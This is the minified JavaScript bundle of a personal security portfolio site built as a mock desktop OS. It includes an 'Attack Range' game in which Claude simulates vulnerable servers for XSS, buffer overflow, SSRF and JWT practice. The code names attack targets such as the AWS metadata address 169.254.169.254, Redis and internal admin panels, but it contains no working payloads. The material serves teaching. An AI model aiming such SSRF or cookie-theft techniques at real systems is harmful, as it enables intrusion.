PAYLOAD"}),i.jsx("div",{className:"ar-code-block",children:JSON.stringify(e.decodedPayload,null,2)})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"ACCESS LEVEL"}),i.jsx("div",{className:`ar-status ${e.adminAccess?"ar-status-pwned":"ar-status-safe"}`,children:e.adminAccess?"⚠ ADMIN ACCESS GRANTED":"● User (no admin access)"})]})]}):i.jsxs(i.Fragment,{children:[i.jsx("div",{className:"ar-comments-pane",children:(n=e.comments)==null?void 0:n.map(t=>i.jsxs("div",{className:`ar-comment ${t.author==="attacker"?"ar-comment-attacker":""}`,children:[i.jsxs("div",{className:"ar-comment-header",children:[i.jsx("span",{className:"ar-comment-author",children:t.author}),i.jsx("span",{className:"ar-comment-ts",children:t.ts})]}),i.jsx("div",{className:"ar-comment-body",children:t.text}),t.author==="attacker"&&e.xssTriggered&&i.jsx("div",{className:"ar-xss-badge",children:"⚡ XSS vector stored"})]},t.id))}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"ADMIN COOKIE (HttpOnly=false)"}),i.jsx("div",{className:"ar-code-block ar-cookie",children:e.cookieStolen?e.adminCookie:"session=eyJhbGci... [not yet stolen]"})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"XSS STATUS"}),i.jsx("div",{className:`ar-status ${e.xssTriggered?"ar-status-pwned":"ar-status-safe"}`,children:e.cookieStolen?"⚠ COOKIE STOLEN":e.xssTriggered?"⚠ XSS TRIGGERED":"● No script injected yet"})]})]})]})}function wv({state:e}){var n;return i.jsxs("div",{className:"ar-viz ar-viz-mem",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"Stack"}),i.jsx("span",{className:"ar-viz-title",children:"auth_service — vuln() frame"})]}),i.jsxs("div",{className:"ar-stack",children:[i.jsx("div",{className:"ar-stack-note",children:"HIGH ADDRESS"}),(n=e.stack)==null?void 0:n.map((t,s)=>i.jsxs("div",{className:`ar-stack-frame ${t.highlight?"ar-frame-hit":""} ${t.label==="return address"&&e.overflowDetected?"ar-frame-overflow":""}`,children:[i.jsx("span",{className:"ar-frame-addr",children:t.addr}),i.jsx("span",{className:"ar-frame-label",children:t.label}),i.jsx("span",{className:"ar-frame-val",children:t.value})]},s)),i.jsx("div",{className:"ar-stack-note",children:"LOW ADDRESS"})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"INPUT"}),i.jsxs("div",{className:"ar-code-block",children:[e.bytesWritten>0?`${e.bytesWritten} bytes written`:"Awaiting input",e.overflowDetected?" — ⚠ OVERFLOW!":""]})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"EIP CONTROL"}),i.jsx("div",{className:`ar-status ${e.shellObtained?"ar-status-pwned":e.overflowDetected?"ar-status-warn":"ar-status-safe"}`,children:e.shellObtained?"⚠ EIP → win() — SHELL OBTAINED":e.overflowDetected?"⚠ Overflow — ret addr overwritten":`● return addr = ${e.currentRetAddr}`})]})]})}function bv({state:e}){var n,t,s,a,r;return i.jsxs("div",{className:"ar-viz ar-viz-shell",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"HTTP"}),i.jsx("span",{className:"ar-viz-title",children:"URL Fetcher — tools.vulnerable-corp.com"})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"LAST REQUESTED URL"}),i.jsx("div",{className:"ar-code-block",style:{wordBreak:"break-all"},children:e.lastUrl||"— (no request yet)"})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"INTERNAL SERVICES"}),i.jsx("div",{className:"ar-file-tree",children:["169.254.169.254 (AWS metadata)","127.0.0.1:8080 (admin panel)","127.0.0.1:6379 (Redis)","internal.corp (internal API)"].map(o=>i.jsxs("div",{className:"ar-tree-file",children:["├── ",o]},o))})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"ACCESS STATUS"}),i.jsx("div",{className:`ar-status ${(n=e.lastUrl)!=null&&n.includes("169.254")||(t=e.lastUrl)!=null&&t.includes("127.0.0.1")||(s=e.lastUrl)!=null&&s.includes("internal")?"ar-status-pwned":"ar-status-safe"}`,children:(a=e.lastUrl)!=null&&a.includes("169.254")?"⚠ AWS METADATA ACCESSED":(r=e.lastUrl)!=null&&r.includes("127.0.0.1")?"⚠ INTERNAL SERVICE ACCESSED":e.lastUrl?"● External URL fetched":"● Awaiting request"})]})]})}function kv({scenario:e,state:n}){if(!n)return null;switch(n.type){case"database":return i.jsx(fv,{state:n});case"shell":return i.jsx(gv,{state:n});case"filesystem":return i.jsx(vv,{state:n});case"dom":return i.jsx(yv,{state:n});case"memory":return i.jsx(wv,{state:n});case"network":return i.jsx(bv,{state:n});default:return null}}function xv({onKey:e}){const[n,t]=g.useState(""),[s,a]=g.useState(!1);return i.jsxs("div",{className:"ar-setup",children:[i.jsx("div",{className:"ar-setup-icon",children:"🎯"}),i.jsx("h1",{className:"ar-setup-title",children:"Attack Range"}),i.jsx("p",{className:"ar-setup-desc",children:"An interactive exploitation playground. Pick a vulnerability, attack a simulated target, and watch the system state change in real time. Powered by Claude acting as the vulnerable server."}),i.jsxs("div",{className:"ar-privacy-box",children:[i.jsx("span",{children:"🔒"}),i.jsxs("span",{children:["Your API key is stored in ",i.jsx("strong",{children:"session storage only"})," — never sent anywhere except ",i.jsx("code",{children:"api.anthropic.com"}),"."]})]}),i.jsx("label",{className:"ar-label",children:"Anthropic API Key"}),i.jsxs("div",{className:"ar-key-row",children:[i.jsx("input",{className:"ar-input",type:s?"text":"password",value:n,onChange:r=>t(r.target.value),placeholder:"sk-ant-...",autoComplete:"off",spellCheck:!1}),i.jsx("button",{type:"button",className:"ar-key-toggle",onClick:()=>a(r=>!r),children:s?"hide":"show"})]}),i.jsx("button",{className:"ar-btn-primary",disabled:!n.trim(),onClick:()=>{sessionStorage.setItem(la,n.trim()),e(n.trim())},children:"Enter the Range"})]})}function Sv({message:e,onDismiss:n}){return i.jsx("div",{className:"ar-win-overlay",children:i.jsxs("div",{className:"ar-win-box",children:[i.jsx("div",{className:"ar-win-icon",children:"💀"}),i.jsx("div",{className:"ar-win-title",children:"EXPLOIT SUCCESSFUL"}),i.jsx("div",{className:"ar-win-msg",children:e}),i.jsx("button",{className:"ar-btn-primary ar-btn-small",onClick:n,children:"Next scenario →"})]})})}function up(){const[e,n]=g.useState(()=>sessionStorage.getItem(la)||""),[t,s]=g.useState(0),[a,r]=g.useState(()=>structuredClone($t[0].initialState)),[o,l]=g.useState([]),[c,d]=g.useState(""),[m,p]=g.useState(!1),[v,b]=g.useState(!1),[w,y]=g.useState(null),[T,f]=g.useState(!1),[u,h]=g.useState(0),[x,k]=g.useState([]),[E,C]=g.useState(!1),[L,O]=g.useState([]),[R,B]=g.useState(-1),K=g.useRef(null),X=g.useRef(null),I=$t[t],D=I.hints[Math.min(u,I.hints.length-1)];g.useEffect(()=>{K.current&&(K.current.scrollTop=K.current.scrollHeight)},[o]);const H=g.useCallback(S=>{s(S),r(structuredClone($t[S].initialState)),l([]),d(""),b(!1),y(null),f(!1),h(0),k([]),O([]),B(-1)},[]),M=g.useCallback(async()=>{var N,P,q,U,ue;const S=c.trim();if(!(!S||m)){O(ee=>[S,...ee]),B(-1),d(""),l(ee=>[...ee,{type:"attacker",text:S}]),p(!0);try{const ee=await fetch(mv,{method:"POST",headers:{"x-api-key":e,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true","content-type":"application/json"},body:JSON.stringify({model:"claude-sonnet-4-6",max_tokens:2048,system:I.systemPrompt,messages:[{role:"user",content:I.buildUserMessage(a,S)}]})});if(!ee.ok){const we=await ee.json().catch(()=>({}));throw new Error(((N=we==null?void 0:we.error)==null?void 0:N.message)||`API error ${ee.status}`)}const dp=(((q=(P=(await ee.json()).content)==null?void 0:P[0])==null?void 0:q.text)||"").replace(/^```(?:json)?\s*/i,"").replace(/\s*```\s*$/i,"").trim();let Mo;try{Mo=JSON.parse(dp)}catch{throw new Error("Response was malformed. Try again.")}const{serverResponse:pp,sqlQuery:Ro,commandExecuted:Oo,resolvedPath:qo,requestMade:Do,tokenAnalysis:zo,renderedHtml:Fo,bytesAnalysis:hp,internalLog:Uo,newState:Za,exploitSuccess:er,successMessage:Bo,attackerNote:Ho}=Mo,mp=[Ro?`SQL: ${Ro}`:null,Oo?`CMD: ${Oo}`:null,qo?`PATH: ${qo}`:null,Do?`REQ: ${Do}`:null,zo?`JWT: ${zo}`:null,Fo?`HTML: ${Fo}`:null,hp||null,Uo?`[${Uo}]`:null].filter(Boolean).join(`
`);l(we=>[...we,{type:"server",text:pp||"(no response)",details:mp},...er?[{type:"win",text:Bo||"Exploit successful!"}]:[]]),er||h(we=>we+1),Za&&typeof Za=="object"&&r(we=>({...we,...Za,type:we.type,sensitiveFiles:we.sensitiveFiles??void 0,adminCookie:we.adminCookie??void 0,internalServices:we.internalServices??void 0})),er&&(b(!0),y(Bo||"You pwned it."),Ho&&(k(we=>[...we,{scenario:I.name,payload:S,note:Ho}]),C(!0)))}catch(ee){const ye=((U=ee.message)==null?void 0:U.toLowerCase().includes("authentication"))||((ue=ee.message)==null?void 0:ue.includes("401"));l(an=>[...an,{type:"error",text:ee.message,isAuth:ye}]),h(an=>an+1)}finally{p(!1),setTimeout(()=>{var ee;return(ee=X.current)==null?void 0:ee.focus()},50)}}},[e,c,m,I,a]),_=g.useCallback(S=>{if(S.key==="Enter"){M();return}S.key==="ArrowUp"&&(S.preventDefault(),B(N=>{const P=Math.min(N+1,L.length-1);return d(L[P]||""),P})),S.key==="ArrowDown"&&(S.preventDefault(),B(N=>{const P=Math.max(N-1,-1);return d(P===-1?"":L[P]||""),P}))},[M,L]);return e?i.jsxs("div",{className:"ar-root",children:[i.jsx("div",{className:"ar-scenarios",children:$t.map((S,N)=>i.jsxs("button",{className:`ar-scenario-btn ${t===N?"ar-scenario-active":""}`,onClick:()=>H(N),children:[i.jsx("span",{className:"ar-scenario-icon",children:S.icon}),i.jsx("span",{className:"ar-scenario-name",children:S.name}),i.jsx("span",{className:"ar-scenario-diff",style:{color:S.dc},children:S.difficulty})]},S.id))}),i.jsxs("div",{className:"ar-infobar",children:[i.jsxs("div",{className:"ar-info-target",children:[i.jsx("span",{className:"ar-info-label",children:"TARGET"}),i.jsx("span",{className:"ar-info-val",children:I.target})]}),i.jsxs("div",{className:"ar-info-objective",children:[i.jsx("span",{className:"ar-info-label",children:"OBJECTIVE"}),i.jsx("span",{className:"ar-info-val",children:I.objective})]}),i.jsxs("div",{className:"ar-infobar-right",children:[x.length>0&&i.jsxs("button",{className:`ar-hint-btn ${E?"ar-hint-active":""}`,onClick:()=>C(S=>!S),children:["📓 Notes (",x.length,")"]}),i.jsx("button",{className:`ar-hint-btn ${T?"ar-hint-active":""}`,onClick:()=>f(S=>!S),children:T?"Hide hint":`Hint${u>0?` (${u} fails)`:""}`}),i.jsx("button",{className:"ar-hint-btn",title:"Re-enter API key",onClick:()=>{sessionStorage.removeItem(la),n("")},children:"🔑 Key"})]})]}),T&&i.jsxs("div",{className:"ar-hint-bar",children:["💡 ",D,u>=2&&i.jsxs("span",{className:"ar-hint-progress",children:[" (",Math.min(u+1,I.hints.length),"/",I.hints.length," hint level)"]})]}),E&&x.length>0&&i.jsxs("div",{className:"ar-notes-panel",children:[i.jsx("div",{className:"ar-notes-header",children:"📓 Attacker Notes — techniques learned"}),x.map((S,N)=>i.jsxs("div",{className:"ar-note",children:[i.jsxs("div",{className:"ar-note-header",children:[i.jsx("span",{className:"ar-note-scenario",children:S.scenario}),i.jsx("span",{className:"ar-note-payload",children:S.payload})]}),i.jsx("div",{className:"ar-note-text",children:S.note})]},N))]}),i.jsxs("div",{className:"ar-main",children:[i.jsxs("div",{className:"ar-terminal-pane",children:[i.jsxs("div",{className:"ar-term-header",children:[i.jsx("span",{className:"ar-dot ar-dot-r"}),i.jsx("span",{className:"ar-dot ar-dot-y"}),i.jsx("span",{className:"ar-dot ar-dot-g"}),i.jsx("span",{className:"ar-term-title",children:"attacker@kali — attack-range"})]}),i.jsxs("div",{className:"ar-term-body",ref:K,children:[o.length===0&&i.jsx("div",{className:"ar-term-welcome",children:i.jsx("span",{className:"ar-term-dim",children:"Attack Range ready. Send your first payload below. Use ↑↓ to recall history."})}),o.map((S,N)=>i.jsxs("div",{className:`ar-entry ar-entry-${S.type}`,children:[S.type==="attacker"&&i.jsxs("div",{className:"ar-entry-line",children:[i.jsx("span",{className:"ar-prompt",children:"attacker@kali:~$ "}),i.jsx("span",{className:"ar-payload",children:S.text})]}),S.type==="server"&&i.jsxs("div",{className:"ar-entry-server",children:[i.jsx("div",{className:"ar-server-response",children:S.text}),S.details&&i.jsx("div",{className:"ar-server-details",children:S.details})]}),S.type==="win"&&i.jsxs("div",{className:"ar-entry-win",children:["███ EXPLOIT SUCCESS: ",S.text," ███"]}),S.type==="error"&&i.jsxs("div",{className:"ar-entry-error",children:["Error: ",S.text,S.isAuth&&i.jsx("button",{className:"ar-inline-rekey",onClick:()=>{sessionStorage.removeItem(la),n("")},children:"🔑 Fix API key"})]})]},N)),m&&i.jsxs("div",{className:"ar-entry ar-entry-loading",children:[i.jsx("span",{className:"ar-loading-dot"}),i.jsx("span",{className:"ar-loading-dot ar-d2"}),i.jsx("span",{className:"ar-loading-dot ar-d3"})]})]}),i.jsxs("div",{className:"ar-term-input-row",children:[i.jsx("span",{className:"ar-prompt",children:"attacker@kali:~$ "}),i.jsx("input",{ref:X,className:"ar-term-input",value:c,onChange:S=>d(S.target.value),onKeyDown:_,placeholder:"enter payload… (↑↓ for history)",disabled:m||v,spellCheck:!1,autoComplete:"off"}),i.jsx("button",{className:"ar-run-btn",onClick:M,disabled:m||!c.trim()||v,children:m?"…":"▶"})]})]}),i.jsx("div",{className:"ar-viz-pane",children:i.jsx(kv,{scenario:I,state:a})})]}),v&&i.jsx(Sv,{message:w,onDismiss:()=>{const S=(t+1)%$t.length;H(S)}})]}):i.jsx(xv,{onKey:n})}function Tv({app:e,win:n,desktop:t}){const s=n.appState||{};switch(e){case"readme":return i.jsx(Po,{onLaunch:t.launch});case"finder":return i.jsx(ep,{});case"notes":return i.jsx(np,{initialSlug:s.selectedSlug,onOpenPost:t.openPost});case"files":return i.jsx(tp,{initialTitle:s.selectedTitle});case"terminal":return i.jsx(sp,{runOnOpen:s.runOnOpen,runOnOpenNonce:s.runOnOpenNonce,onLaunch:t.launch});case"timeline":return i.jsx(ap,{});case"mail":return i.jsx(rp,{});case"system":return i.jsx(ip,{});case"games":return i.jsx(lp,{initialGame:s.initialGame});case"exploitlab":return i.jsx(cp,{});case"attackrange":return i.jsx(up,{});default:return null}}function Ev({autoOpen:e,autoOpenSlug:n,freshBoot:t}){var w;const s=Sg(),[a,r]=g.useState(n||null);g.useEffect(()=>{if(n){s.launch("notes",{selectedSlug:n}),r(n);return}if(e){s.launch(e);return}t&&s.launch("readme")},[]),g.useEffect(()=>{const y=T=>{(T.metaKey||T.ctrlKey)&&T.key.toLowerCase()==="k"?(T.preventDefault(),s.toggleSpotlight()):T.key==="Escape"&&s.closeSpotlight()};return window.addEventListener("keydown",y),()=>window.removeEventListener("keydown",y)},[s]);const o=g.useRef(s.windows);g.useEffect(()=>{o.current=s.windows},[s.windows]),g.useEffect(()=>{const y=()=>{o.current.filter(T=>T.app==="terminal").forEach(T=>s.close(T.id))};return window.addEventListener("hemos-close-term",y),()=>window.removeEventListener("hemos-close-term",y)},[]);const l=(w=s.windows.find(y=>y.id===s.focusId))==null?void 0:w.app,c=[...new Set(s.windows.map(y=>y.app))],d=g.useCallback(y=>{s.launch("notes",{selectedSlug:y}),r(y)},[s.launch]),m=g.useCallback(y=>{s.launch("terminal",{runOnOpen:`cat cve ${y}`,runOnOpenNonce:Date.now()})},[s.launch]),p={launch:s.launch,closeActive:()=>{s.focusId!=null&&s.close(s.focusId)},minimizeAll:()=>s.windows.forEach(y=>{y.minimized||s.minimize(y.id)}),closeAll:()=>s.windows.forEach(y=>s.close(y.id)),hasFocus:s.focusId!=null,hasOpen:s.windows.length>0},b=s.windows.filter(y=>!y.minimized).length===0&&!a;return i.jsxs("div",{className:"desktop",children:[i.jsx(Gf,{activeApp:l,onSpotlight:s.toggleSpotlight,actions:p}),i.jsx("div",{className:"dmark",children:` ▒ HEM-OS 1.7.0
  curiosity-d ✓
  43 pentests
  18 posts
  12 certs
  1  patent
  ∞  questions`}),b&&i.jsx("div",{className:"desktop-welcome",children:i.jsx(Po,{onLaunch:s.launch})}),s.windows.map(y=>i.jsx(Yf,{win:y,focused:y.id===s.focusId,onClose:s.close,onMinimize:s.minimize,onToggleMaximize:s.toggleMaximize,onFocus:s.focus,onMove:s.move,onResize:s.resize,children:i.jsx(Tv,{app:y.app,win:y,desktop:{...s,openPost:d}})},y.id)),i.jsx(Kf,{onLaunch:s.launch,openApps:c}),s.spotlightOpen&&i.jsx("div",{onClick:s.closeSpotlight,style:{position:"fixed",inset:0,zIndex:70,background:"rgba(0,0,0,0.3)"},children:i.jsx(Jd,{onClose:s.closeSpotlight,onLaunch:s.launch,onOpenPost:d,onRunCveCommand:m})}),a&&i.jsx(Zd,{slug:a,onClose:()=>r(null)})]})}function _v(e,n){const t=n||{};switch(e){case"readme":return i.jsx(Po,{onLaunch:t.onLaunch});case"finder":return i.jsx(ep,{});case"notes":return i.jsx(np,{initialSlug:t.selectedSlug,onOpenPost:t.onOpenPost});case"files":return i.jsx(tp,{initialTitle:t.selectedTitle});case"terminal":return i.jsx(sp,{runOnOpen:t.runOnOpen,runOnOpenNonce:t.runOnOpenNonce,onLaunch:t.onLaunch});case"timeline":return i.jsx(ap,{});case"mail":return i.jsx(rp,{});case"system":return i.jsx(ip,{});case"games":return i.jsx(lp,{initialGame:t.initialGame});case"exploitlab":return i.jsx(cp,{});case"attackrange":return i.jsx(up,{});default:return null}}function Nv({autoOpen:e,autoOpenSlug:n}){var T;const[t,s]=g.useState(e||"readme"),[a,r]=g.useState({}),[o,l]=g.useState(n||null),[c,d]=g.useState(!1),[m,p]=g.useState(new Date);g.useEffect(()=>{const f=setInterval(()=>p(new Date),3e4);return()=>clearInterval(f)},[]),g.useEffect(()=>{n?(s("notes"),r({selectedSlug:n})):e&&s(e)},[e,n]);const v=(f,u)=>{s(f),r(u||{})},b=f=>l(f),w=f=>{s("terminal"),r({runOnOpen:`cat cve ${f}`,runOnOpenNonce:Date.now()})},y=g.useMemo(()=>({...a,onLaunch:v,onOpenPost:b}),[a]);return i.jsxs("div",{className:"mshell",children:[i.jsxs("div",{className:"mtop",children:[i.jsx("span",{className:"brand",children:"⌘ HEM-OS"}),i.jsx("span",{children:((T=_e[t])==null?void 0:T.title)||"Desktop"}),i.jsx("span",{className:"clk",children:m.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})}),i.jsx("span",{className:"sp-icon",onClick:()=>d(!0),children:"⌕"})]}),i.jsx("div",{className:"mbody",children:_v(t,y)}),i.jsx("div",{className:"mtabs",children:Yd.map(f=>{const u=_e[f],h=u.title.split(" ")[0][0],x=u.title.split("—")[0].trim();return i.jsxs("div",{className:`mt ${t===f?"on":""}`,onClick:()=>{s(f),r({})},children:[i.jsx("div",{className:`mtg ${u.g}`,children:h}),i.jsx("div",{className:"mtl",children:x})]},f)})}),o&&i.jsx(Zd,{slug:o,onClose:()=>l(null)}),c&&i.jsx("div",{onClick:()=>d(!1),style:{position:"fixed",inset:0,zIndex:80,background:"rgba(0,0,0,0.4)"},children:i.jsx(Jd,{onClose:()=>d(!1),onLaunch:v,onOpenPost:b,onRunCveCommand:w})})]})}const xc=768;function Cv(){const[e,n]=g.useState(()=>typeof window>"u"?!1:window.innerWidth<=xc);return g.useEffect(()=>{const t=()=>n(window.innerWidth<=xc);return window.addEventListener("resize",t),()=>window.removeEventListener("resize",t)},[]),e}const Sc="hemos:bootSeen";function Io({autoOpen:e,autoOpenSlug:n}){const[t]=$f(),s=Cv(),a=t.get("boot")==="1",r=!!e||!!n,[o,l]=g.useState(()=>{if(a)return"boot";if(r)return"shell";try{if(typeof window<"u"&&localStorage.getItem(Sc)==="1")return"shell"}catch{}return"boot"}),[c,d]=g.useState(!1);return g.useEffect(()=>{o==="shell"&&document.body.classList.add("dark")},[o]),o==="boot"?i.jsx(Wf,{onDone:()=>{try{localStorage.setItem(Sc,"1")}catch{}d(!0),l("shell")}}):s?i.jsx(Nv,{autoOpen:e,autoOpenSlug:n}):i.jsx(Ev,{autoOpen:e,autoOpenSlug:n,freshBoot:c})}function jv(){const{slug:e}=Sf();return i.jsx(Io,{autoOpenSlug:e})}function Tc(){return i.jsx(Io,{})}function Ks({app:e}){return i.jsx(Io,{autoOpen:e})}function Lv(){return i.jsx(Hf,{children:i.jsxs(zf,{children:[i.jsx(yn,{path:"/",element:i.jsx(Tc,{})}),i.jsx(yn,{path:"/blog/:slug",element:i.jsx(jv,{})}),i.jsx(yn,{path:"/blogs",element:i.jsx(Ks,{app:"notes"})}),i.jsx(yn,{path:"/projects",element:i.jsx(Ks,{app:"files"})}),i.jsx(yn,{path:"/certifications",element:i.jsx(Ks,{app:"timeline"})}),i.jsx(yn,{path:"/cve-map",element:i.jsx(Ks,{app:"games"})}),i.jsx(yn,{path:"*",element:i.jsx(Tc,{})})]})})}Dd(document.getElementById("root")).render(i.jsx(Rc.StrictMode,{children:i.jsx(Lv,{})}));
